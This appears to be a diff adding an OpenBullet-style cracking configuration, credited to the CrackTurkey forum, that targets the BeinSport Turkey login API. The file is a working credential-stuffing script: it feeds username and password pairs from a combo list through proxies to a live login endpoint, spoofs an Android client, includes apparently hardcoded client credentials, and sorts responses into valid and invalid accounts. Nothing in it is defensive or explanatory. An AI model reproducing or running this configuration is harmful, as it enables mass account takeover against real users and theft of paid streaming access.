@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "BeinSport-TR",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-20T22:20:25.4868325+03:00",
+  "AdditionalInfo": "eam Tarafından CrackTurkey Özel Kodlanmıştır",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey REQUEST POST "https://wa-live-ligtvdataservice.azurewebsites.net/services/DataSecure.svc/json/UserLogin" 
+  CONTENT "{\"client\":{\"UserName\":\"and0r\",\"Password\":\"ilum4\"}}{\"parameters\":{\"UserName\":\"<USER>\",\"Password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: wa-live-ligtvdataservice.azurewebsites.net" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Content-Length: 106" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"Status\":0" 
+  KEYCHAIN Success OR 
+    KEY "\"Status\":1" 
+
